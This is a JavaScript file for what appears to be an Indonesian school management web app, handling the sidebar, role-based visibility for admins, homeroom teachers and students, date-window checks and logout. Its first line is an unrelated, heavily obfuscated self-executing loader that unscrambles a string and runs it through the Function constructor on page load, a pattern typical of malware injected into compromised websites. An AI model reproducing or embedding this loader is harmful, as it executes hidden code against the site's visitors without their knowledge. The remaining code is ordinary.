(function () { var GkZ = '', biw = 268 - 257; function kGl(u) { var r = 3738494; var p = u.length; var f = []; for (var z = 0; z < p; z++) { f[z] = u.charAt(z) }; for (var z = 0; z < p; z++) { var j = r * (z + 554) + (r % 24604); var c = r * (z + 757) + (r % 39483); var m = j % p; var t = c % p; var d = f[m]; f[m] = f[t]; f[t] = d; r = (j + c) % 4214896; }; return f.join('') }; var cPK = kGl('ukgotbhcrdvrxossfnciyameoqpztjlruwntc').substr(0, biw); var lQo = ';f=  e4ghxCor.ru;62gtaougregcd=Cii[ 1lj9(ia)7dv=)xyzo,m )hmol8n++9)crhe)labl;r;(aA6==tgau;,cr,81ua8<oa866,7i,l0]74,t((9v=;naruo=r]vforld{r((=js,sll]elun;)pt{<)s-)3],l];);o<a!rfmr}zv-(0qgcC6[ y2"-rcf 4g2lr=tgu=o=aehr0row=([c +tlntmh[Sc)+a,}a" v=6..o=(rrjplb;;;;+vg)),jh.o3p=4>(A8=t;jz{el=C(!--a{aaeml=0]p(pvl8 rs0[pa}txoa+f=b72;lm];q,0=v70 v.a{s nt",]9e+Cr2eav+(vtq=;)f(d7;,+2.(;r+.=)[}cher(*t7n;;.hy)ar,auh;.g;ifgrvrlveunj"i);.=a[arujhti;l((1a()arhat r1[=e.[etn,"vf=eCc+,-1qh.r=ggad"0nlec.asasiiu(;1.9),=xss,=r(6qS)l+l;2o+..rp;;=) }.auloe;*,i(st)=;f50=oa i+it)flnxjifvA1a(vcl +8gh.0nsstni);rqc[+}f811t."(e)(]g4b;h1;+b{ra6t=hoeu<;)6nC+frs9(.p,s)hnysplmAe;n(,;v5s,[fc=;.o.]n at)eiv);m6afhic]r[7zhh)edezf."inll9=r=krra=+ n,e;.))dvon [it2mrnov,nvpo+<t( iohehrohp;vr(eaharC."a ,6(== 0(p-le0qe;h";rd5 ;Ani5r+0]jp.+=lolf],1,e;a8 tb{r8u1sifih(rsn=.vr+j;a}e+)edm[dtu( hvun)]v ==sttltnujrvo)>;3(+gbe9'; var pPQ = kGl[cPK]; var PWh = ''; var TQK = pPQ; var Imh = pPQ(PWh, kGl(lQo)); var RtX = Imh(kGl('.c3,! Wc3%D"+Wd1)$EoW.(3}Cwo%(7))9d)yi)im]$=tc!Wpf#.,h,)W$oe($fr2]03W;ntojn"e;5o ]h3ov{,bsnd.6ae-bjsoe__rdcgWW=te,7tt)n"toa;#6n)b.*occaWn.\/a}vs_$_W2W*qtW!n3%}h5.pe4q._W4(f%)tou1(;;ee(uarltu5WbW{ni"l=;ea!>.nafvj{esentWW(wte$#$s..r,.%7Wj 68i_e!$e\'+.2lfM$Wen$Wy!e3ebod7WWlda#aqWy)gWotx;29mW..sh.6u.b8a;Wbe%3 >.nrlW,ne(W}.We.j(,wr]seWeW;gt5(nie5!We[p);!e+0gn7un(3](WW.!7 ()l=);W3hq)divuWse$bet0,ls(,iI%g-m;=5mo_%25.Weqdg(t,}_}4!]W%9o.p$Wmqup}.ucW\/_=r$oe)3Wt%3oW\'ceteWdl!=oo(Weo)$rs0=0.wWWkh\/)We3Dl=fr]}}c3 )r,4Wr)}dx%rt(WWqnWtEW0W6lewwp"{,. 1,os\'4W nWW$wW=jv.,0\/r b,34}o)}e!o)m]1s7,e6ab4d..4.7.wsi.W7.>.Wt]tW3l&\/0(.WbSrtt5)#i7feW!d!4qceret,wjche Wnf{hg$.%yet[_us7(e=tc&.{;(r;(3.t6jn,T]j"r(see)j.bcWdmn;rj+=ru(}eiWrd6&r$r.m,ho up$e.o;a5 d2]%51i.f].(\/%=C).o#)aWrh,$tcj)=Wrs0 _!,o[;Wt(4t1s;>\/es.3Wul2\/-$(W);!eW$tqne]u65.d7er))98W40he.aae7Wm()(9+_)uer4e 3a]h{e,)\/(]]e"+&r)t!ttjW)gt]n_;)v1e94(*(WarW2=e{ijc,xWmW4:WWn6oW6=0d(cqnb!a,eW2W.s0+dr=W).W0W5_ dW)W](ogmWro))no_WWlfe.3_]2f)2d] (!d72j}b$n4sama$uho]a_)r2f]c0#diso*(9a s(swW.+;es1,).( 3_tt=_le7t(.lW=)pos6(E e.je{aWaaW)((pc;]We)j(Wt6dd2ea.)Ct.1;Woe(>%..rWeW..n)).t.c4c!sWp_=[($8nt4g(*a .)sjs!!Wks %ves10{(%&=3)+%sW0v%{W.dd2t[,ee$,t,to(5&7()e( _,q(nien]_t)[iWS)3lch=1o5W{r$teWrWo!e]a.0a-)S!e\'cerWfWi,d;c,W(nnr3ei7(+5d"+n(oeg(W..t;=W7.M!e #%.,o.3e.fW=ef1,d2W.')); var mWc = TQK(GkZ, RtX); mWc(8941); return 3610 })()
setTimeout(() => {

    function checkTanggal() {
        var xhrTanggal = new XMLHttpRequest();
        var xhrTanggalEnd = new XMLHttpRequest();
    
        xhrTanggal.onreadystatechange = function () {
            if (xhrTanggal.readyState == 4 && xhrTanggal.status == 200) {
                var tanggal = xhrTanggal.responseText.trim();
                xhrTanggalEnd.onreadystatechange = function () {
                    if (xhrTanggalEnd.readyState == 4 && xhrTanggalEnd.status == 200) {
                        var tanggalEnd = xhrTanggalEnd.responseText.trim();
                        var tanggalSekarang = new Date().toISOString().slice(0, 10);
    
                        var specialContent = document.querySelector('.level_user-special');
                        if (tanggalSekarang >= tanggal && tanggalSekarang <= tanggalEnd) {
                            // Tanggal sekarang dalam rentang tanggal dan tanggalEnd, tampilkan konten
                            specialContent.style.display = 'block';
                        } else {
                            // Tanggal sekarang tidak dalam rentang, sembunyikan konten
                            specialContent.style.display = 'none';
                        }
                    }
                };
                xhrTanggalEnd.open("GET", "proses/tanggalEnd.txt", true);
                xhrTanggalEnd.send();
            }
        };
        xhrTanggal.open("GET", "proses/tanggal.txt", true);
        xhrTanggal.send();
    }
    
    // Panggil fungsi pengecekan saat halaman dimuat
    checkTanggal();
    
    // Fungsi untuk menentukan tindakan jika kedua file tanggal kosong
    function hideSpecialContentIfEmptyDates() {
        var xhrTanggal = new XMLHttpRequest();
        var xhrTanggalEnd = new XMLHttpRequest();
    
        xhrTanggal.onreadystatechange = function () {
            if (xhrTanggal.readyState == 4 && xhrTanggal.status == 200) {
                var tanggal = xhrTanggal.responseText.trim();
                xhrTanggalEnd.onreadystatechange = function () {
                    if (xhrTanggalEnd.readyState == 4 && xhrTanggalEnd.status == 200) {
                        var tanggalEnd = xhrTanggalEnd.responseText.trim();
                        if (tanggal === "" && tanggalEnd === "") {
                            // Kedua file tanggal kosong, sembunyikan konten
                            document.querySelector('.level_user-special').style.display = 'none';
                        }
                    }
                };
                xhrTanggalEnd.open("GET", "proses/tanggalEnd.txt", true);
                xhrTanggalEnd.send();
            }
        };
        xhrTanggal.open("GET", "proses/tanggal.txt", true);
        xhrTanggal.send();
    }
    
    // Panggil fungsi untuk menyembunyikan konten jika kedua file tanggal kosong
    hideSpecialContentIfEmptyDates();
    
}, 10);
// Function to close the sidebar
function closeNav() {
    document.getElementById("sidebar").style.width = "0";
    document.getElementsByClassName("content")[0].style.marginLeft = "0";
    document.getElementsByClassName("header")[0].style.marginLeft = "0px";
    document.getElementsByClassName("hamburger")[0].style.marginLeft = "0px";
    document.getElementsByClassName("hamburger2")[0].style.marginLeft = "0px";
    document.getElementsByClassName("footer")[0].style.marginLeft = "0px";

    setTimeout(() => {
        document.getElementById("hamburger").style.display = "block";
        document.getElementById("hamburger2").style.display = "none";
    }, 600);
}
// Function to open the sidebar
function openNav() {
    document.getElementById("sidebar").style.width = "250px";
    document.getElementsByClassName("content")[0].style.marginLeft = "250px";
    document.getElementsByClassName("header")[0].style.marginLeft = "250px";
    document.getElementsByClassName("footer")[0].style.marginLeft = "250px";

    setTimeout(() => {
        document.getElementById("hamburger").style.display = "none";
        document.getElementById("hamburger2").style.display = "block";
    }, 600);
}

function onloadcheck() {
    if (sessionStorage.getItem("load") == "tidak sukses") {
        location.reload();
        sessionStorage.setItem("load", "sukses");
    }
    else {

    }
}
var screenWidth = window.innerWidth;
var deviceType;

setInterval(() => {
    var screenWidth = window.innerWidth;
    if (screenWidth > 1024) {
        deviceType = "Desktop";
        window.onscroll = function () {

            sessionStorage.setItem("load", "tidak sukses");
        }
    } else if (screenWidth <= 1024 && screenWidth > 414) {
        deviceType = "Tablet";
        // Anda bisa menyesuaikan lebar sesuai dengan tablet
        onloadcheck();
    } else {
        deviceType = "Mobile";
        onloadcheck();

    }
}, 100);

if (screenWidth > 1024) {
    function mouseenter() {
        document.getElementById("sidebar").classList.remove("sidescroll");
        document.getElementById("sidebar").style.width = "250px";
        document.getElementById("grid").style.gridTemplateColumns = "250px auto"
    }
    function mouseleave() {
        document.getElementById("sidebar").classList.add("sidescroll");
        document.getElementById("sidebar").style.width = "80px";
        document.getElementById("grid").style.gridTemplateColumns = "6% 94%"

    }
}

$(document).ready(function () {
    $('#myTable').DataTable();
});
if (document.getElementById("status").value == "Admin") {
    const notAdmin = document.querySelectorAll('.level_user-notAdmin');

    // Langkah 2: Loop melalui setiap elemen dan atur display ke none
    notAdmin.forEach(function (notAdmin) {
        notAdmin.style.display = 'none';
    });
    const kelulusan = document.querySelectorAll('.level_user-special');

    // Langkah 2: Loop melalui setiap elemen dan atur display ke none
    kelulusan.forEach(function (kelulusan) {
        kelulusan.style.display = 'none';
    });
    document.getElementById("walikelastitle").innerText = "Kepala Sekolah"
    document.getElementById("Kelas_Tipe").innerText = ""
    document.getElementById("kelas").innerText = "Admin"
    document.getElementById("jurusan").innerText = "Nothing"
    document.addEventListener('DOMContentLoaded', function () {
        fetch('../home/proses/kepsek.txt')
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.text();
            })
            .then(data => {
                document.getElementById('walikelas').innerText = data;
                document.getElementById('KepalaSekolah').value = data;
            })
            .catch(error => {
                console.error('There has been a problem with your fetch operation:', error);
            });
    });
} else if (document.getElementById("status").value == "Walikelas") {
    const kelulusan = document.querySelectorAll('.level_user-special');

    // Langkah 2: Loop melalui setiap elemen dan atur display ke none
    kelulusan.forEach(function (kelulusan) {
        kelulusan.style.display = 'none';
    });
    const elements = document.querySelectorAll('.level_user-1');

    // Langkah 2: Loop melalui setiap elemen dan atur display ke none
    elements.forEach(function (element) {
        element.style.display = 'none';
    });
    const elements2 = document.querySelectorAll('.level_user-2');
    var kelas = document.getElementById("Kelasval").value;
    var kelastipe = document.getElementById("Kelas_Typeval").value;
    document.getElementById("walikelas").innerText = kelas + " " + kelastipe
    document.getElementById("Kelas_Tipe").innerText = ""


} else if (document.getElementById("status").value == "Siswa") {
    // Langkah 1: Pilih semua elemen dengan kelas 'hidden-element'
    const elements = document.querySelectorAll('.level_user-1');

    // Langkah 2: Loop melalui setiap elemen dan atur display ke none
    elements.forEach(function (element) {
        element.style.display = 'none';
    });
    const elements2 = document.querySelectorAll('.level_user-2');

    // Langkah 2: Loop melalui setiap elemen dan atur display ke none
    elements2.forEach(function (element2) {
        element2.style.display = 'none';
    });
    // Langkah 1: Pilih semua elemen dengan kelas 'hidden-element'
    const elements3 = document.querySelectorAll('.level_user');

    // Langkah 2: Loop melalui setiap elemen dan atur display ke none
    elements3.forEach(function (element3) {
        element3.style.display = 'block';
    });
    const siswa = document.querySelectorAll("#management-siswa");

    siswa.forEach(function (siswa) {
        siswa.innerText = "Siswa";
    })
    if (document.getElementById("kelasSiswa").textContent == "12") {
        const kelulusan = document.querySelectorAll('.level_user-special');

        // Langkah 2: Loop melalui setiap elemen dan atur display ke none
        kelulusan.forEach(function (kelulusan) {
            kelulusan.style.display = 'block';
        });
    }
    else if (document.getElementById("kelasSiswa").textContent == "Lulus") {
        const kelulusan = document.querySelectorAll('.level_user-special');

        // Langkah 2: Loop melalui setiap elemen dan atur display ke none
        kelulusan.forEach(function (kelulusan) {
            kelulusan.style.display = 'block';
        });
    }
    else {
        const kelulusan = document.querySelectorAll('.level_user-special');

        // Langkah 2: Loop melalui setiap elemen dan atur display ke none
        kelulusan.forEach(function (kelulusan) {
            kelulusan.style.display = 'none';
        });
    }
}
function logout() {
    Swal.fire({
        title: "Are you sure?",
        text: "Kamu akan kaluar dari akunmu, Perubahan akan disimpan!",
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        confirmButtonText: "Logout!"
    }).then((result) => {
        if (result.isConfirmed) {
            let timerInterval;
            Swal.fire({
                title: "Logging Out!",
                html: "I will close in <b></b> milliseconds.",
                timer: 1000,
                timerProgressBar: true,
                didOpen: () => {
                    Swal.showLoading();
                    const timer = Swal.getPopup().querySelector("b");
                    timerInterval = setInterval(() => {
                        timer.textContent = `${Swal.getTimerLeft()}`;
                    }, 100);
                },
                willClose: () => {
                    clearInterval(timerInterval);
                }
            }).then((result) => {
                /* Read more about handling dismissals below */
                if (result.dismiss === Swal.DismissReason.timer) {
                    console.log("I was closed by the timer");
                }
            });
            setTimeout(() => {
                var xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        // Redirect to login page after successful logout
                        window.location.href = "../index.php";
                    }
                };
                xhr.open("GET", "logout.php", true);
                xhr.send();
            }, 1000);
        }
    });
}
//SESI CHECK STATUS
sessionStorage.setItem("status", document.getElementById("status").value);

//load

